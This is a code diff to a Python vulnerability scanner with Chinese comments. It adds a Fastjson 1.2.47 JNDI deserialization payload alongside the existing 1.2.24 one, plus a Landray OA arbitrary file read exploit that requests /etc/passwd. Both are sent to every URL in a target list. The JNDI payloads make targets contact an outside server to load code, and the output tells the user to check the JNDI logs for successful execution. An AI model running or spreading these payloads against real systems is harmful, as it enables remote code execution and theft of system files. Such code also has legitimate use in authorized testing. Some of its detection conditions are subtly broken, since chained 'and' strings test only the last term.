@@ -382,26 +382,89 @@ def fastjson_vuln_scan():
         'Content-Type': 'application/json',
         'Content-Length': '160'
     }
-    # 构造POST请求的body  
+    # 构造POST请求的body-1.2.24版本
     fastjson_data = {  
         "b": {  
             "@type": "com.sun.rowset.JdbcRowSetImpl",  
             "dataSourceName": jndi_server,  
             "autoCommit": True  
         }  
-    }  
+    }
+    # 构造POST请求的body-1.2.47版本
+    fastjson_data_v2 = {
+        
+        "a":{
+            "@type":"java.lang.Class",
+            "val":"com.sun.rowset.JdbcRowSetImpl"
+        },
+        "b":{
+            "@type":"com.sun.rowset.JdbcRowSetImpl",
+            "dataSourceName":jndi_server,
+            "autoCommit":True
+    }
+}
     # 将data字典转换为JSON字符串  
     data_json = json.dumps(fastjson_data) 
+    data_json_v2 = json.dumps(fastjson_data_v2)
     for url in url_list:
+        # fastjson 1.2.24反序列化漏洞
         try:
             # 发送POST请求  
-            fastjson_response = requests.post(url, headers=fastjson_header, data=data_json,allow_redirects=False,verify=False)
+            fastjson_response = requests.post(url, headers=fastjson_header, data=data_json,allow_redirects=False,verify=False,timeout=30)
             fastjson_response.encoding='utf-8'
             fastjson_response_text = fastjson_response.text
             if 'timestamp' and '500' and 'Internal Server Error' and 'set property error, autoCommit' in fastjson_response_text:
-                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在fastjson反序列漏洞,请检查JNDI服务日志确认是否成功执行")
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在fastjson1.2.24反序列漏洞,请检查JNDI服务日志确认是否成功执行")
         except:
             pass
+
+        # fastjson 1.2.47反序列化漏洞
+        try:
+            # 发送POST请求  
+            fastjson_response_v2 = requests.post(url, headers=fastjson_header, data=data_json_v2,allow_redirects=False,verify=False,timeout=30)
+            fastjson_response_v2.encoding='utf-8'
+            fastjson_response_v2_text = fastjson_response_v2.text
+            if 'timestamp' and '400' and 'Bad Request' and 'set property error, autoCommit' and 'com.alibaba.fastjson.JSONException' in fastjson_response_v2_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+" "+"存在fastjson1.2.47反序列漏洞,请检查JNDI服务日志确认是否成功执行")
+        except:
+            pass
+
+# 蓝凌OA漏洞扫描，正在完善中
+def lanlingoa_vuln_scan():
+    url_list = basic.url_file_ip_list()
+   
+    # 获取当前时间
+    now = datetime.now()
+    # 格式化时间，只保留时、分、秒
+    formatted_time = now.strftime("%H:%M:%S")
+    # 任意文件读取路径
+    file_read_dir = "/sys/ui/extend/varkind/custom.jsp"
+    lanlingoa_header = {
+        'User-Agent': 'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15',
+        'Content-Length': '42',
+        'Content-Type': 'application/x-www-form-urlencoded',
+        'Accept-Encoding': 'gzip'
+    }
+
+    data = 'var={"body":{"file":"file:///etc/passwd"}}'
+    
+    for url in url_list:
+        try:
+            # 发送POST请求
+            lanling_response = requests.post(url+file_read_dir, headers=lanlingoa_header, data=data,allow_redirects=False,verify=False,timeout=1)
+            lanling_response.encoding='utf-8'
+            lanling_response_text = lanling_response.text
+            
+            if 'root' and '/bin/bash' in lanling_response_text:
+                print("[+]"+" "+formatted_time+" "+"目标："+" "+url+file_read_dir+" "+"存在蓝凌OA任意文件读取漏洞")
+            else:
+                print("[-]"+" "+formatted_time+" "+"目标："+" "+url+file_read_dir+" "+"不存在蓝凌OA任意文件读取漏洞")
+        except:
+            pass
+    
+
+
+
 
 
 
@@ -417,7 +480,9 @@ if __name__ == "__main__":
         elif func_name == 'tomcat_vuln_scan':
             tomcat_vuln_scan()
         elif func_name == 'fastjson_vuln_scan':
-            fastjson_vuln_scan()    
+            fastjson_vuln_scan()
+        elif func_name == 'lanlingoa_vuln_scan':
+            lanlingoa_vuln_scan()    
         else:
             print("Invalid function number")
     else:
